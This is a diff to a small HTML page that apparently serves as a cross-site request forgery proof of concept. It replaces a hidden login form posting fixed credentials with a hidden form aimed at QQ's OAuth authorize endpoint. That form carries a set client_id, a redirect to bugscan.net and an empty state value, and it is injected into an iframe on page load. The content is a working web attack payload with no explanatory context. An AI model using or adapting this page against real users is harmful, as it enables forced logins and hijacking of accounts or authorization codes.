@@ -2,19 +2,24 @@
 <head>
 <script>
 function load() {
-    var postdata = '<form id=dynForm method=POST action=\'https://www.example.com/login.php?login_attempt=1\'>' +
-                    '<input type=hidden name=email value=example@live.com />' +
-                    '<input type=hidden name=pass value=password />' +
-                    '<input type=hidden name=locale value=en_US />' +
+    var postdata = '<form action="https://graph.qq.com/oauth2.0/authorize" method="POST">' +
+                    '<input type="hidden" name="response_type" value="code" />' +
+                    '<input type="hidden" name="client_id" value="100265387" />' +
+                    '<input type="hidden" name="redirect_uri" value="http://www.bugscan.net/accounts/login/sns/qq" />' +
+                    '<input type="hidden" name="scope" value="get_user_info" />' +
+                    '<input type="hidden" name="state" value="" />' +
+                    '<input type="hidden" name="src" value="1" />' +
+                    '<input type="hidden" name="update_auth" value="0" />' +
+                    '<input type="hidden" name="openapi" value="1010_2020" />' +
+                    '<input type="submit" value="Submit form" />' +
                     '</form>';
     top.frames[0].document.body.innerHTML=postdata;
-    //top.frames[0].document.getElementById('dynForm').submit();
 }
 </script>
 </head>
 <body onload="load()">
  
-<iframe src="about:blank" id="noreferer"></iframe>
+<iframe src="about:blank"></iframe>
  
  
 </body>
